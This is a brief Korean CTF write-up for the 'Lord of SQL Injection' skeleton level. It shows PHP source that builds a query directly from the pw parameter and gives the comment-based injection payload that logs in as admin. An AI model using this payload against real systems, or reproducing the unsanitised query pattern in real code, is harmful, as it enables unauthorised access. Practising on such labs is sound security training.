## Lord of SQL Injection No. 10- skeleton
## 문제 출제 의도
Get방식으로 입력 받은 뒤에 추가 문자열이 있어도 문제 해결이 가능한지 확인한다.
## 소스 코드 분석
+ 소스 코드
skeleton의 소스 코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id'] == 'admin') solve("skeleton"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - Get 방식으로 받은 문자열에 'prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
    - 문제 풀이에 성공하는 조건은 쿼리를 통해 받은 id 값이 'admin'이면 풀이에 성공한다.
## 문제 해결
+ 추가 문자열
    ~~~
    ?pw=' or id='admin' -- -
    ~~~
    을 입력하면 뒤의 'and 1=0'는 주석처리 되어 문제가 해결된다.